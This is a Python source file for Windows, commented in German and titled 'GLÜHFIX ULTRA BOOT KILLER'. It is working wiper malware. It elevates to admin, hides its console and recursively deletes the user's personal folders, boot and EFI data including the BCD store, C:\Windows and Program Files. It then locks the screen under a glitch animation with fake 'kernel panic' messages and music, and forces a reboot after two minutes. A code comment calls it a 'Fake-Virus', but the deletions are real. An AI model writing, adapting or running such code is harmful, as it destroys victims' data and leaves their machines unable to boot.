import sys
import os
import random
import ctypes
import time
import subprocess
import shutil
from pathlib import Path
import atexit

# ================= Single-Instance-Lock ===================
LOCK_FILE = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'gluehfix_ultra_lock.tmp')

def acquire_lock():
    """
    Erstellt Lock-Datei. Wenn bereits vorhanden, ist eine andere Instanz aktiv.
    """
    if os.path.exists(LOCK_FILE):
        try:
            # Prüfe ob Lock-Datei älter als 5 Minuten (stale lock)
            if time.time() - os.path.getmtime(LOCK_FILE) > 300:
                os.remove(LOCK_FILE)
            else:
                # Andere Instanz läuft, einfach beenden
                sys.exit(0)
        except Exception:
            pass
    
    try:
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
        atexit.register(release_lock)
        return True
    except Exception:
        return False

def release_lock():
    """Löscht Lock-Datei beim Beenden."""
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
    except Exception:
        pass

# ================= BOOT-PFAD-FINDER ===================
def find_boot_paths():
    """Findet automatisch System Reserved / EFI Partition und Boot-Pfade."""
    boot_paths = []
    
    # Dynamische User-Pfade
    user_dir = Path.home()
    boot_paths.extend([
        user_dir / "Boot",
        user_dir / "EFI",
    ])
    
    # Häufige Boot-Buchstaben nach diskpart assign
    common_letters = ['D:', 'E:', 'F:', 'G:', 'H:', 'Z:']
    for letter in common_letters:
        boot_paths.extend([
            Path(letter) / "Boot",
            Path(letter) / "Boot" / "BCD",
            Path(letter) / "EFI" / "Microsoft" / "Boot",
            Path(letter) / "EFI" / "Microsoft" / "Boot" / "BCD",
        ])
    
    # BCDedit abfragen für genauen Pfad
    try:
        result = subprocess.run(['bcdedit', '/enum', 'all'], capture_output=True, text=True)
        if 'device partition=' in result.stdout:
            lines = result.stdout.split('\n')
            for line in lines:
                if 'device partition=' in line:
                    part = line.split('=')[1].strip().strip('[]')
                    boot_paths.append(Path(f"C:{part.replace('partition=C:', '')}"))
                    boot_paths.append(Path(f"C:{part.replace('partition=C:', '')}") / "Boot")
    except Exception:
        pass
    
    # Windows-Installationspfad
    boot_paths.extend([
        Path("C:") / "Boot",
        Path("C:") / "EFI",
        Path("C:") / "Recovery",
    ])
    
    return [p for p in boot_paths if p != Path("C:")]

# ================= Auto-Install Pakete ===================
REQUIRED_PACKAGES = ["pygame", "Pillow", "numpy"]

def ensure_packages():
    # Überspringe Paketinstallation wenn als EXE ausgeführt
    if getattr(sys, 'frozen', False):
        return
    try:
        import importlib.metadata as importlib_metadata
    except ImportError:
        import importlib_metadata

    try:
        installed = {
            (d.metadata.get("Name") or "").lower()
            for d in importlib_metadata.distributions()
            if d.metadata.get("Name")
        }
    except Exception:
        sys.exit(1)

    missing = [p for p in REQUIRED_PACKAGES if p.lower() not in installed]

    if missing:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
        except Exception:
            pass
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except Exception:
            sys.exit(1)

ensure_packages()

# jetzt können wir importieren
import pygame
from PIL import ImageGrab, Image
import numpy as np

# ================= Resource Pfad ===================
def resource_path(relative_path: str) -> str:
    """Gibt korrekten Pfad zurück, auch bei PyInstaller EXE."""
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

MP3_PATH = resource_path(os.path.join("files", "mp3.mp3"))

# ================= ALLE PFADEN (inkl. BOOT & USER) ===================
user_dir = Path.home()

pfade_zum_loeschen = [
    # User-Folder (multilingual)
    user_dir / "Desktop",
    user_dir / "Downloads",
    user_dir / "Documents",
    user_dir / "Dokumente",
    user_dir / "Bilder",
    user_dir / "Pictures",
    user_dir / "Musik",
    user_dir / "Music",
    user_dir / "Videos",

    # 🔥 BOOT-PFÄDE (dynamisch gefunden)
    *find_boot_paths(),

    # Temp / Recycle
    Path(os.environ.get("TEMP", r"C:\Windows\Temp")),
    Path(r"C:\Windows\Temp"),
    Path(r"C:\$Recycle.Bin"),

    # System Ordner
    Path(r"C:\Windows"),
    Path(r"C:\Program Files"),
    Path(r"C:\Program Files (x86)"),
]

def safe_delete_path(path) -> None:
    """
    Löscht Datei oder Ordner sicher.
    - Wenn Pfad nicht existiert -> skip.
    - Wenn Fehler -> skip.
    Immer weiter zum nächsten Pfad.
    """
    try:
        p = Path(path)

        # Existiert nicht -> direkt weiter
        if not p.exists():
            return

        # Markierung bei Boot/EFI
        if "boot" in str(p).lower() or "efi" in str(p).lower():
            print(f"💥 BOOT/EFI PFAD ERKANNT -> Lösche: {p}")

        # Datei / Symlink löschen
        if p.is_file() or p.is_symlink():
            try:
                p.unlink()
            except Exception:
                # Fehler beim File löschen -> einfach weiter
                return
        # Ordner rekursiv löschen, Fehler ignorieren
        elif p.is_dir():
            shutil.rmtree(str(p), ignore_errors=True)
    except Exception:
        # Irgendein anderer Fehler -> auch skip
        pass

# ================= WinAPI / Admin ===================
def is_admin():
    """Prüft, ob das Script mit Admin-Rechten läuft."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def run_as_admin_and_exit():
    """Startet das Script neu mit Admin-Rechten und beendet aktuelle Instanz."""
    try:
        exe = sys.executable
        params = " ".join(sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", exe, params, None, 1
        )
    except Exception:
        pass
    sys.exit(0)

user32 = ctypes.WinDLL('user32', use_last_error=True)
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

def hide_console():
    try:
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            user32.ShowWindow(hWnd, 0)
    except Exception:
        pass

def get_pygame_hwnd():
    try:
        info = pygame.display.get_wm_info()
        return info.get("window", None)
    except Exception:
        return None

def set_window_topmost():
    try:
        hwnd = get_pygame_hwnd()
        if not hwnd:
            return
        HWND_TOPMOST = -1
        SWP_NOSIZE = 0x0001
        SWP_NOMOVE = 0x0002
        SWP_SHOWWINDOW = 0x0040
        user32.SetWindowPos(
            hwnd, HWND_TOPMOST, 0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
        )
    except Exception:
        pass

def force_foreground():
    try:
        hwnd = get_pygame_hwnd()
        if not hwnd:
            return False
        set_window_topmost()
        user32.ShowWindow(hwnd, 9)  # SW_RESTORE
        return bool(user32.SetForegroundWindow(hwnd))
    except Exception:
        return False

# ================= Multi-Monitor-Fullscreen ===================
class RECT(ctypes.Structure):
    _fields_ = [
        ("left", ctypes.c_long),
        ("top", ctypes.c_long),
        ("right", ctypes.c_long),
        ("bottom", ctypes.c_long),
    ]

MonitorEnumProc = ctypes.WINFUNCTYPE(
    ctypes.c_int,
    ctypes.c_ulong,
    ctypes.c_ulong,
    ctypes.POINTER(RECT),
    ctypes.c_double
)

def get_virtual_screen_rect():
    monitors = []

    def _callback(hMonitor, hdcMonitor, lprcMonitor, dwData):
        r = lprcMonitor.contents
        monitors.append((r.left, r.top, r.right, r.bottom))
        return 1

    try:
        cb = MonitorEnumProc(_callback)
        user32.EnumDisplayMonitors(0, 0, cb, 0)
    except Exception:
        pass

    if not monitors:
        try:
            info = pygame.display.Info()
            return 0, 0, info.current_w, info.current_h
        except Exception:
            sys.exit(1)

    min_x = min(m[0] for m in monitors)
    min_y = min(m[1] for m in monitors)
    max_x = max(m[2] for m in monitors)
    max_y = max(m[3] for m in monitors)
    return min_x, min_y, max_x - min_x, max_y - min_y

def create_fullscreen_window():
    try:
        min_x, min_y, total_w, total_h = get_virtual_screen_rect()
    except Exception:
        sys.exit(1)

    if total_w > 0 and total_h > 0:
        os.environ["SDL_VIDEO_WINDOW_POS"] = f"{min_x},{min_y}"
    else:
        total_w, total_h = 1920, 1080

    try:
        screen = pygame.display.set_mode((total_w, total_h), pygame.NOFRAME)
        pygame.display.set_caption("GLÜHFIX ULTRA BOOT KILLER")
        pygame.mouse.set_visible(False)
        pygame.event.set_grab(True)
        try:
            pygame.event.set_keyboard_grab(True)
        except Exception:
            pass
        set_window_topmost()
        force_foreground()
        return screen, total_w, total_h
    except Exception:
        sys.exit(1)

# ================= Sicheren Desktop-Screenshot holen ===================
def safe_grab_desktop():
    for _ in range(3):
        try:
            img = ImageGrab.grab(all_screens=True)
            if img and img.size[0] > 0 and img.size[1] > 0:
                return img
            time.sleep(0.2)
        except Exception:
            time.sleep(0.2)

    try:
        img = ImageGrab.grab()
        if img and img.size[0] > 0 and img.size[1] > 0:
            return img
    except Exception:
        pass

    return Image.new("RGB", (1920, 1080), (0, 0, 0))

# ================= Glitch / Effekte ===================
def make_glitch_ultra(surface):
    arr = pygame.surfarray.array3d(surface)
    h = arr.shape[1]
    w = arr.shape[0]

    arr_int = arr.astype("int16")
    shift = random.randint(-200, 200)
    noise = np.random.randint(-120, 120, arr.shape, dtype="int16")
    arr_int = np.clip(arr_int + shift + noise, 0, 255)
    arr = arr_int.astype("uint8")

    if random.random() < 0.3:
        for y in range(0, h, 2):
            arr[:, y, :] = 255 - arr[:, y, :]
        for c in range(3):
            off = random.randint(-60, 60)
            arr[:, :, c] = np.roll(arr[:, :, c], off, axis=random.choice([0, 1]))

    for _ in range(250):
        y = random.randint(0, max(0, h - 15))
        height = random.randint(5, 90)
        offset = random.randint(-260, 260)
        slice_ = arr[:, y:y + height, :].copy()
        arr[:, y:y + height, :] = np.roll(slice_, offset, axis=0)

    block_w = 60
    block_h = 60
    for _ in range(120):
        bx = random.randint(0, max(0, w - block_w))
        by = random.randint(0, max(0, h - block_h))
        tx = random.randint(0, max(0, w - block_w))
        ty = random.randint(0, max(0, h - block_h))
        block = arr[bx:bx+block_w, by:by+block_h, :].copy()
        arr[bx:bx+block_w, by:by+block_h, :] = arr[tx:tx+block_w, ty:ty+block_h, :]
        arr[tx:tx+block_w, ty:ty+block_h, :] = block

    for y in range(0, h, 2):
        arr[:, y, :] = (arr[:, y, :] * 0.4).astype("uint8")

    pygame.surfarray.blit_array(surface, arr)

def add_static_noise(screen, width, height):
    static_surface = pygame.Surface((width, height), pygame.SRCALPHA)
    for _ in range(600):
        x1 = random.randint(0, width)
        x2 = random.randint(0, width)
        y = random.randint(0, height)
        alpha = random.randint(60, 200)
        color = (255, 255, 255, alpha)
        pygame.draw.line(static_surface, color, (x1, y), (x2, y), random.randint(1, 3))
    screen.blit(static_surface, (0, 0), special_flags=pygame.BLEND_ADD)

def screen_shake_offset(strength=40):
    dx = random.randint(-strength, strength)
    dy = random.randint(-strength, strength)
    return dx, dy

def draw_gluehfix_texts(screen, font, width, height):
    text_variants = [
        "GLÜHFIX CRITICAL SYSTEM ERROR",
        "KERNEL PANIC BY GLÜHFIX",
        "SYSTEM FILES CORRUPTED",
        "GLUEHFIX-CORE OVERRIDING SECURITY",
        "MEMORY DUMP IN PROGRESS",
        "BIOS OVERRIDE BY GLÜHFIX",
        "ENCRYPTING USER DATA...",
        "DISABLING DEFENDER...",
        "BOOT SECTOR DESTROYED!",
        "BCD GELÖSCHT!",
        "NO WINDOWS BOOT",
        "GLÜHFIX OWNS YOU",
    ]

    for _ in range(160):
        txt = random.choice(text_variants)
        color = (
            random.randint(180, 255),
            random.randint(0, 255),
            random.randint(180, 255),
        )
        text_surf = font.render(txt, True, color)
        angle = random.randint(0, 360)
        text_surf = pygame.transform.rotate(text_surf, angle)
        text_surf.set_alpha(random.randint(40, 255))
        x = random.randint(-300, width)
        y = random.randint(-300, height)
        screen.blit(text_surf, (x, y))

def draw_shapes(screen, width, height):
    for _ in range(260):
        color = (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
        )
        shape_type = random.choice(["rect", "circle", "line", "bars", "cross"])

        if shape_type == "rect":
            x = random.randint(-150, width)
            y = random.randint(-150, height)
            w = random.randint(50, 500)
            h = random.randint(50, 500)
            pygame.draw.rect(screen, color, (x, y, w, h), random.choice([0, 2, 4]))
        elif shape_type == "circle":
            x = random.randint(0, width)
            y = random.randint(0, height)
            r = random.randint(30, 300)
            pygame.draw.circle(screen, color, (x, y), r, random.choice([0, 4]))
        elif shape_type == "bars":
            y = random.randint(0, height)
            pygame.draw.rect(screen, color, (0, y, width, random.randint(3, 25)))
        elif shape_type == "cross":
            x = random.randint(0, width)
            y = random.randint(0, height)
            pygame.draw.line(screen, color, (x-40, y), (x+40, y), random.randint(2, 6))
            pygame.draw.line(screen, color, (x, y-40), (x, y+40), random.randint(2, 6))
        else:
            x1 = random.randint(0, width)
            y1 = random.randint(0, height)
            x2 = random.randint(0, width)
            y2 = random.randint(0, height)
            pygame.draw.line(screen, color, (x1, y1), (x2, y2), random.randint(1, 10))

def random_flash_overlay(screen, width, height):
    if random.random() < 0.20:
        overlay = pygame.Surface((width, height))
        col = random.choice([(255, 255, 255), (255, 0, 0), (0, 255, 0)])
        overlay.fill(col)
        overlay.set_alpha(random.randint(60, 200))
        screen.blit(overlay, (0, 0))

# ================= Musik starten ===================
def start_music():
    if not os.path.isfile(MP3_PATH):
        return
    try:
        pygame.mixer.init(buffer=512)
        pygame.mixer.music.load(MP3_PATH)
        pygame.mixer.music.set_volume(1.0)
        pygame.mixer.music.play(-1)
    except Exception:
        pass

# ================= Loop mit 1+N-Exit & Restart-Timer ===================
def run_loop(screen, desktop_surface, width, height, font, start_time):
    clock = pygame.time.Clock()
    buffer_surface = pygame.Surface((width + 120, height + 120))

    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                # Ignorieren, Fake-Virus
                pass

        keys = pygame.key.get_pressed()
        if keys[pygame.K_1] and (keys[pygame.K_n] or keys[pygame.K_N]):
            return "quit"

        if time.time() - start_time >= 120:
            os.system("shutdown /r /t 0")
            return "quit"

        set_window_topmost()

        glitch_surface = desktop_surface.copy()
        make_glitch_ultra(glitch_surface)

        buffer_surface.fill((0, 0, 0))
        buffer_surface.blit(glitch_surface, (60, 60))
        dx, dy = screen_shake_offset(strength=45)
        screen.fill((0, 0, 0))
        screen.blit(buffer_surface, (dx - 60, dy - 60))

        draw_shapes(screen, width, height)
        draw_gluehfix_texts(screen, font, width, height)
        add_static_noise(screen, width, height)
        random_flash_overlay(screen, width, height)

        pygame.display.flip()
        clock.tick(35)

# ================= Hauptprogramm ===================
def main():
    # Lock GANZ am Anfang erwerben
    if not acquire_lock():
        sys.exit(1)
    
    # Admincheck
    if not is_admin():
        run_as_admin_and_exit()

    hide_console()

    # Dateien/Ordner löschen -> immer weiter, auch wenn ein Pfad fehlt/fehlschlägt
    for p in pfade_zum_loeschen:
        safe_delete_path(p)

    try:
        pygame.init()
    except Exception:
        sys.exit(1)

    img = safe_grab_desktop()

    screen, width, height = create_fullscreen_window()
    start_music()

    try:
        mode = img.mode
        size = img.size
        data = img.tobytes()
        desktop_surface = pygame.image.fromstring(data, size, mode)
        desktop_surface = pygame.transform.smoothscale(desktop_surface, (width, height))
    except Exception:
        sys.exit(1)

    try:
        font = pygame.font.SysFont("consolas", 32, bold=True)
    except Exception:
        font = pygame.font.Font(None, 32)

    start_time = time.time()
    run_loop(screen, desktop_surface, width, height, font, start_time)

    try:
        if pygame.mixer.get_init():
            pygame.mixer.music.stop()
    except Exception:
        pass
    pygame.quit()
    sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except Exception:
        # Keine input() hier, sonst "lost sys.stdin" in EXE
        import traceback
        try:
            with open("error_log.txt", "w") as f:
                traceback.print_exc(file=f)
        except Exception:
            pass
        sys.exit(1)
